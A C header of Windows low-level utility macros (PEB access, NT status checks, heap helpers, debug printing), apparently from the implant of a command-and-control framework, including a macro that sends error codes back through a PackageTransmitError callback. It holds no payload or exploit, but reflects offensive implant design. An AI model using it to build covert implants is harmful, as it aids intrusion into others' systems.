#ifndef DEMON_MACROS_H
#define DEMON_MACROS_H

#include <stdio.h>

#ifdef _WIN64
#define PPEB_PTR __readgsqword( 0x60 )
#else
#define PPEB_PTR __readgsqword( 0x30 )
#endif

#define NT_SUCCESS(Status)              ( ( ( NTSTATUS ) ( Status ) ) >= 0 )
#define NtCurrentProcess()              ( HANDLE ) ( ( HANDLE ) - 1 )
#define NtCurrentThread()               ( ( HANDLE ) ( LONG_PTR ) - 2 )
#define NtGetLastError()                Instance->ThreadEnvBlock->LastErrorValue
#define NtSetLastError(x)               Instance->ThreadEnvBlock->LastErrorValue = x
#define NtSetLastError(x)               Instance->ThreadEnvBlock->LastErrorValue = x
#define NtProcessHeap()                 Instance->ThreadEnvBlock->ProcessEnvironmentBlock->lpProcessHeap
#define NtHeapAlloc( x )                Instance->Win32.RtlAllocateHeap( NtProcessHeap(), HEAP_ZERO_MEMORY, x );

#define RVA( TYPE, DLLBASE, RVA )  ( TYPE ) ( ( PBYTE ) DLLBASE + RVA )
#define HTONS( x )                      __builtin_bswap16( x )
#define DATA_FREE( d, l ) \
    MemSet( d, 0, l ); \
    Instance->Win32.LocalFree( d ); \
    d = NULL;

#define SEC( x )                        __attribute__( ( section( ".text$" #x "" ) ) )
#define U_PTR( x )                      ( ( UINT_PTR ) x )
#define C_PTR( x )                      ( ( LPVOID ) x )

// DEBUG
#ifdef DEBUG
#define PRINTF( f, ... )                { printf( "[DEBUG::%s::%d] " f, __FUNCTION__, __LINE__, __VA_ARGS__ ); }
#else
#define PRINTF( f, ... )                { ; }
#endif

#ifdef DEBUG
#define PUTS( s )             { printf( "[DEBUG::%s::%d] %s\n", __FUNCTION__, __LINE__, s ); }
#else
#define PUTS( s ) { ; }
#endif

#define MemCopy                         __builtin_memcpy
#define CALLBACK_GETLASTERROR                 PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );

#ifdef DEBUG
#define PRINT_HEX( b, l )                               \
    printf( #b ": [%d] [ ", l );                        \
    for ( int i = 0 ; i < l; i++ )                      \
    {                                                   \
        printf( "%02x ", ( ( PUCHAR ) b ) [ i ] );      \
    }                                                   \
    puts( "]" );
#else
#define PRINT_HEX( b, l ) {}
#endif

#endif
